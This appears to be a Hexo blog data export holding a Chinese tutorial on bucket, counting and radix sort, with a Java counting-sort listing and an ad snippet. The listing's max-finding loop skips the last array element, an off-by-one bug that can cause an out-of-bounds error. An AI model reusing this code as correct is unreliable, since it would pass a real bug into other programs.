%}\n</div>\n\n今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。\n\n实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容小结\n{% endnote %}\n</div>\n\n今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。\n\n桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。\n\n### 课后思考\n\n我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。\n\n假设我们现在需要对\n\n\n\n<br>\n<br>\n<br>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-排序(下)","published":1,"updated":"2018-12-10T10:51:00.155Z","_id":"cjpdmv00r00134cv0419qgiu9","comments":1,"layout":"post","photos":[],"link":"","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。</p>\n<p>这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要<strong>学习的重点是掌握这些排序算法的适用场景</strong>。</p>\n<p>按照惯例，我先给出一道思考题：<font color=\"red\"><strong>如何根据年龄给100万用户排序？</strong></font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"桶排序\"><a href=\"#桶排序\" class=\"headerlink\" title=\"桶排序\"></a>桶排序</h3></div><br></div>\n\n<p>首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/桶排序原理图.jpg\">\n<p>桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。</p>\n<p>如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。</p>\n<p><strong>桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？</strong></p>\n<p>答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。</p>\n<p>首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。</p>\n<p>其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。</p>\n<p><strong>桶排序比较适合用在外部排序中</strong>，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。</p>\n<p>比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？</p>\n<p>现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。</p>\n<p>我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。</p>\n<p>理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。</p>\n<p>不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？</p>\n<p>针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"计数排序\"><a href=\"#计数排序\" class=\"headerlink\" title=\"计数排序\"></a>计数排序</h3></div><br></div>\n\n<p>个人觉得，<strong>计数排序其实是桶排序的一种特殊情况</strong>。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。</p>\n<p>我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？</p>\n<p>考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。</p>\n<p>计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。<strong>不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？</strong></p>\n<p>想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。</p>\n<p>考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计算排序01.jpg\">\n<p>从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序02.jpg\">\n<p>那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。</p>\n<p>思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序03.jpg\">\n<p>有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。</p>\n<p>我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。</p>\n<p>以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序04.jpg\">\n<p>上面的过程有点复杂，我将其写成代码如下，你可以对照看下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CountSort</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[] &#123;<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">// 20个人的成绩进行计数排序</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序前：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">        countSort(a);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序后：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">countSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> n = a.length;</span><br><span class=\"line\">        <span class=\"comment\">/* 创建桶数组C */</span></span><br><span class=\"line\">        <span class=\"comment\">// 1、查找原数组的数据范围（必须是正整数）</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span> max = a[<span class=\"number\">0</span>];</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i&lt;a.length-<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a[i]&gt;max)&#123;</span><br><span class=\"line\">                max = a[i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2、根据数据范围创建桶数组</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] C = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[max+<span class=\"number\">1</span>];</span><br><span class=\"line\">        <span class=\"comment\">// 2.1、扫描原数组，将数据的个数放入桶C中</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> anA : a) &#123;</span><br><span class=\"line\">            C[anA]++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 2.2、将C数组中的数据依次累加</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>;i&lt;=max;i++)&#123;</span><br><span class=\"line\">            C[i] = C[i-<span class=\"number\">1</span>] + C[i];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 3、根据C桶中的计数将原数组a中的数据依次放入A数组中</span></span><br><span class=\"line\">        <span class=\"comment\">// 3.1、创建临时数组A</span></span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] A = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[n];</span><br><span class=\"line\">        <span class=\"comment\">// 3.2、从后向前扫描a，并根据C放入A</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = n-<span class=\"number\">1</span>; i&gt;=<span class=\"number\">0</span>; i--)&#123;</span><br><span class=\"line\">            A[C[a[i]]-<span class=\"number\">1</span>] = a[i];</span><br><span class=\"line\">            C[a[i]]--;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 4、拷贝数组A到原数组a</span></span><br><span class=\"line\">        System.arraycopy(A, <span class=\"number\">0</span>, a, <span class=\"number\">0</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这种利用另外一个数组来计数的实现方式是不是非常巧妙呢？这也是这种排序算法加计数排序的原因。不过，你千万不要死记硬背上面的排序过程，重要的是理解和应用。</p>\n<p>总结一下，<strong>计数排序只能用在数据范围不大的场合，如果数据范围k比要排序的数据n大很多，就不适合用计数排序了。而且，计数排序只能给非负整数排序，如果要排序的数据是其他类型的，要将其在不改变相对大小的情况下，转化为非负整数。</strong></p>\n<p>比如，还是拿考生这个例子。如果考生的成绩精确到小数后一位，我们就需要将所有的分数乘以10，转化为整数。然后在放入到9010个桶中。再比如，如果要排序的数据中有负数，数据范围是[-1000,1000]，那我们就需要对每个数据先加1000，转化为非负整数。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"基数排序\"><a href=\"#基数排序\" class=\"headerlink\" title=\"基数排序\"></a>基数排序</h3></div><br></div>\n\n<p>我们再来看这样一个问题。假如我们有10万个手机号码，希望将这10万个手机号码从小到大排序，你有什么比较快速的排序方法？</p>\n<p>我们之前讲的快排，时间复杂度可以做到$O(nlogN)$，还有更高效的排序算法吗？桶排序、计数排序能排上用场吗？手机号有11位，范围很大，显然不适合用这两种算法。针对这个排序问题，有没有时间复杂度是O(n)的排序算法呢？下面我们就来看一种新的排序算法：基数排序。</p>\n<p>刚刚这个问题有这样的规律：如果比较的两个手机号a、b，前面的几位中，a手机号码已经比b大了，那后面的几位就不用比较了。</p>\n<p>借助稳定排序算法，这里有一个巧妙的实现思路。还记得在排序第一节中，我们讲到排序算法的稳定性时提到的订单的例子吗？我们这里也可以借助相同的处理思路，先按照最后一位来排序手机号，然后，再利用稳定排序算法按照倒数第二位来重新排序，以此类推，最后按照第一位重新排序，经过11次排序之后，手机号就有序了。</p>\n<p>手机号码稍微有点长，画图不容易看清楚，我这里用三位数进行排序的例子，画了一张基数排序的过程分解图，你可以看下：</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/基数排序01.jpg\">\n<p>注意，这里按照每位进行排序的排序算法必须是稳定的，否则这个实现思路就是不正确的。因为如果是非稳定排序，那最后一次排序只会考虑最高位的大小顺序，完全不会管其他位的大小关系，那么低位的排序就完全没有意义了。</p>\n<p>根据每一位来排序，我们可以用刚刚讲过的桶排序或者计数排序，他们的时间复杂度可以做到O(n)，如果要排序的数据有k位，那我们就要k次桶排序或者计数排序，总的时间复杂度是O(k*n)。当k不大的时候，比如手机号排序的例子，k最大就是11，所以基数排序的时间复杂度近似于O(n)。</p>\n<p>实际上，有时候要排序的数据并不都是等长的，比如我们排序牛津字典中的20万个英文单词，最短的只有一个字母，最长的大概有45个字母，那么对于这种不等长的数据，基数排序还适用吗？</p>\n<p>实际上，<strong>我们可以把所有的单词补齐到相同的长度，位数不够的可以在后面补“0”</strong>，因为根据ASCII表，所有的字母值都大于“0”，所以补“0”并不会影响到原有的大小顺序，这样就可以继续基数排序了。</p>\n<p>总结一下，<strong>基数排序对于要排序的数据是有要求的，需要可以分割出独立的“位”来比较，而且位之间有递进的关系，如果a数据的高位比b数据大，那剩下的位就不需要比较了，除此之外，每一位的数据范围不能太大，要可以用线性排序来排序，否则，基数排序的时间复杂度就不可能做到O(n)</strong>。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"解答开篇\"><a href=\"#解答开篇\" class=\"headerlink\" title=\"解答开篇\"></a>解答开篇</h3></div><br></div>\n\n<p>今天的内容学完了，我们在回过头来看开篇的问题：如何按照年龄给100万用户排序？现在是不是问题变得简单了。</p>\n<p>实际上，根据年龄给100万用户排序，就类似按照成绩给50万用户排序。我们假设年龄的范围最小1岁，最大不超过120岁，我们可以遍历这100万用户，根据年龄将其放入这120个桶中，然后依次遍历这120个桶中的元素，这样就得到了按照年龄排序的100万用户数据。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"内容小结\"><a href=\"#内容小结\" class=\"headerlink\" title=\"内容小结\"></a>内容小结</h3></div><br></div>\n\n<p>今天，我们学习了三种线性时间复杂度的排序算法，有桶排序、计数排序、基数排序。他们对要排序的数据有非常严格的要求，应用不是很广泛，但是如果数据特征符合这些排序算法的要求，应用这些算法，会非常高效，线性时间复杂度可以达到O(n)。</p>\n<p>桶排序和计数排序非常相似，都是针对数据范围不大的数据，将数据划分成不同的桶来实现排序。基数排序要求数据可以排成高低位，高位相同在比较低位。而且每一位的数据范围都不能太大，因为基数排序算法需要借助桶排序或计数排序实现每一位的排序工作。</p>\n<h3 id=\"课后思考\"><a href=\"#课后思考\" class=\"headerlink\" title=\"课后思考\"></a>课后思考</h3><p>我们今天讲的都是针对特殊数据的排序算法。实际上，还有很多看似是排序但又不需要使用排序算法就能处理的排序问题。</p>\n<p>假设我们现在需要对</p>\n<p><br><br><br><br><br></p>\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\" style=\"display:block\" data-ad-client=\"ca-pub-4127326375481893\" data-ad-slot=\"9105526840\" data-ad-format=\"auto\" data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","site":{"data":{}},"excerpt":"","more":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上一节着重分析了几种常用排序算法的原理、时间复杂度、空间复杂度、稳定性等。今天会接触三种时间复杂度为O(n)的排序算法：桶排序、基数排序、计数排序。因为这些排序算法的时间复杂度是线性的，所以把这类排序算法叫做线性排序。之所以能做到线性的时间复杂度，是因为这三种算法是基于非比较的排序算法，都不涉及元素之间的比较操作。</p>\n<p>这几种算法理解起来都不难，时间、空间复杂度分析起来也很简单，但是对要排序的数据要求很苛刻，所以今天要<strong>学习的重点是掌握这些排序算法的适用场景</strong>。</p>\n<p>按照惯例，我先给出一道思考题：<font color=\"red\"><strong>如何根据年龄给100万用户排序？</strong></font>，你可能会说，我用上一节讲的归并、快排就可以搞定啊！是的，他们也可以完成功能，但是时间复杂度最低也是$O(n*logN)$。有没有更快的排序方法呢？</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"桶排序\"><a href=\"#桶排序\" class=\"headerlink\" title=\"桶排序\"></a>桶排序</h3></div><br></div>\n\n<p>首先，我们来看桶排序。桶排序，顾名思义，要用到“桶”，核心思想是将要排序的数据分到几个有序的桶里，每个桶里的数据再单独排序。桶内排完序之后，再把桶里的数据按照顺序依次取出，组成的序列就是有序的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/桶排序原理图.jpg\">\n<p>桶排序的时间复杂度为什么是O(n)呢？我们一块儿来分析一下。</p>\n<p>如果要排序的数据有n个，我们把他们均匀的划分到m个桶内，每个桶里就有k=n/m个元素。每个桶内部使用快速排序，时间复杂度是$O(k*logk)$。m个桶排序的时间复杂度就是$O(m*k*logk)$，因为k=n/m，所以整个桶排序的时间复杂度就是$O(n*log\\frac{n}{m})$，当桶的个数m非常接近个数n时，$log\\frac{n}{m}$就是一个非常小的常量，这个时候桶排序的时间复杂度就接近O(n)。</p>\n<p><strong>桶排序看起来很优秀，那它是不是可以代替前面我们所说的排序算法呢？</strong></p>\n<p>答案是否定的，为了让你理解桶排序的原理，上面我们做了很多假设。实际上桶排序对数据的要求是非常苛刻的。</p>\n<p>首先，要排序的数据天然的就能划分成m个桶，并且桶与桶之间有着天然的大小顺序，这样每个桶内的数据都排序之后，桶与桶之间数据不需要再排序了。</p>\n<p>其次，数据在各个桶之间的分布是非常均匀的。如果数据经过桶的划分之后，有的桶里的数据非常多，有些非常少，很不均匀，那桶内数据排序的时间复杂度就不是常量级了。在极端情况下，如果数据都被划分到了一个桶里，那就退化为了$O(n*logN)$的排序算法了。</p>\n<p><strong>桶排序比较适合用在外部排序中</strong>，外部排序是指数据存储在外部磁盘中，数据量比较大，内存有限，无法将数据全部加载到内存中。</p>\n<p>比如我们又10GB的订单数据，我们希望按照订单金额（假设金额都是正整数）进行排序，但是我们的内存有限，只有几百MB，没办法一次性把10GB数据全部加载到内存中。这个时候我们怎么办呢？</p>\n<p>现在我来讲一下，如何借助桶排序的处理思想来解决这个问题。</p>\n<p>我们可以先扫描一遍文件，看订单金额所处的数据范围。假设经过扫描之后我们得到，订单金额最小的是1元，最大是10万元。我们将所有订单根据金额划分到100个桶里，第一个桶存储1-1000元之间的订单，第二个桶存储1001-2000之间的订单，以此类推。每一个桶对应一个文件，并且按照金额范围大小顺序编号命名（00, 01, 02, 03 … 99）。</p>\n<p>理想情况下，如果订单金额在1-10万之间均匀分布，那订单会被均匀划分到100个文件中，每个小文件存储大约100MB的内容，我们就可以将这100个小文件依次读取到内存中进行排序。等所有文件都排序号之后，我们只需要按照订单编号，从小到大依次读取每个小文件中的订单数据，并将其写入到一个文件中，那这个文件中存储的就是按照金额从小到大的订单数据了。</p>\n<p>不过，你可能也发现了，订单金额在1元到10万元之间并不一定是均匀分布的，所以10GB订单数据是无法均匀的划分到100个文件中的。有可能某个金额区间的数据特别多，划分之后对应的文件就会特别大，没法一次性读入内存，这时候该怎么办呢？</p>\n<p>针对这些划分之后还是比较大的文件，我们可以继续划分，比如，订单金额在1-1000之间的比较多，我们可以将这个区间再划分为10个小区间，1元到100元，101元到200元，201元到300元……901到1000元。如果划分之后，101元到200元之间订单还是太多，那就在继续划分，直到所有的文件都能读入内存为止。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"计数排序\"><a href=\"#计数排序\" class=\"headerlink\" title=\"计数排序\"></a>计数排序</h3></div><br></div>\n\n<p>个人觉得，<strong>计数排序其实是桶排序的一种特殊情况</strong>。当要排序的n个数据，所处的范围并不大时，比如最大值是k，我们可以把数据分成k个桶，每个数据桶内的数据值是相同的，这样就省去了桶内的数据排序的时间。</p>\n<p>我们都经历过高考，高考计分系统还记得吗？我们查分数的时候，会显示我们的成绩以及所在省的排名。如果你所在省的考生有50万，那如何根据成绩快速排序得出名次呢？</p>\n<p>考生的满分是900分，最低是0分，这个数据的范围很小，所以我们可以分成901个桶，对应分数从0分到900分，根据考生的成绩，我们将这50万个考生划分到这901个桶内，桶内的数据都是分数相同的考生，所有并不需要排序。我们只需要依次扫描每个桶，将桶内的考生输出到一个数组中，就实现了50万考生的排序。因为只涉及扫描遍历操作，所以时间复杂度是O(n)。</p>\n<p>计数排序的算法思想就是这么简单，跟桶排序非常类似，只是桶的大小粒度不一样。<strong>不过，为什么这个算法叫做”计数”排序呢？”计数”的含义来自哪里？</strong></p>\n<p>想弄明白这个问题，我们就要来看计数排序算法的实现方法。我们还是拿考生那个例子，为了方便说明，我对数据规模做了简化。假设猪油8个考生，分数在0-5之间，这8个考生的成绩存放在一个数组A[8]中，他们分别是2,5,3,0,2,3,0,3。</p>\n<p>考生的成绩从0分到5分，我们使用大小为6个数组C[6]表示桶，其中下标对应考生个数。像我们刚刚举得例子，我们只需要遍历以便考生分数，就可以得到C[6]的值。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计算排序01.jpg\">\n<p>从图中可以看出，分数为3分的考生有3个，小于3分的考生有4个，所以，成绩为3的考生在排序之后的有序数组R[8]中，会保存下标4,5,6的位置。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序02.jpg\">\n<p>那如何快速计算出，每个分数的考生在有序数组中对应的存储位置呢？这个处理方法很巧妙，很不容易想到。</p>\n<p>思路是这样的：我们对C[6]数组顺序求和，C[6]数组就变成了下面这个样子。C[k]里存储的就是小于等于分数k的考生个数。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序03.jpg\">\n<p>有了前面的数据准备之后，现在就要讲解计数排序中最复杂、最难理解的一部分了。</p>\n<p>我们从后向前依次扫描数组A。比如，当扫描到3时，我们可以从数组C中取出下标为3的值7，也就是说，到目前为止，包括自己在内，分数小于等于3的考生有7个，也就是说3是数组R中第7个元素（也就是R[6]的位置）。当3放入数组R中后，小于等于3的元素就剩下了6个了，所以对应的C[6]也要减一，变成6。</p>\n<p>以此类推，当我们扫描到第二个分数为3的考生的时候，就会把它放入数组R中的第6个元素的位置(也就是下标为5的位置)。当我们扫描完数组A后，数组R内的数据就是按照分数从小到大有序排列的了。</p>\n<img src=\"/posts/2018-09-25-算法-排序(下)/计数排序04.jpg\">\n<p>上面的过程有点复杂，我将其写成代码如下，你可以对照看下。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CountSort</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span>[] a = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[] &#123;<span class=\"number\">5</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">6</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">5</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">10</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">2</span>,<span class=\"number\">0</span>&#125;; <span class=\"comment\">// 20个人的成绩进行计数排序</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序前：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">        countSort(a);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"计数排序后：\"</span>+Arrays.toString(a));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">countSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> n = 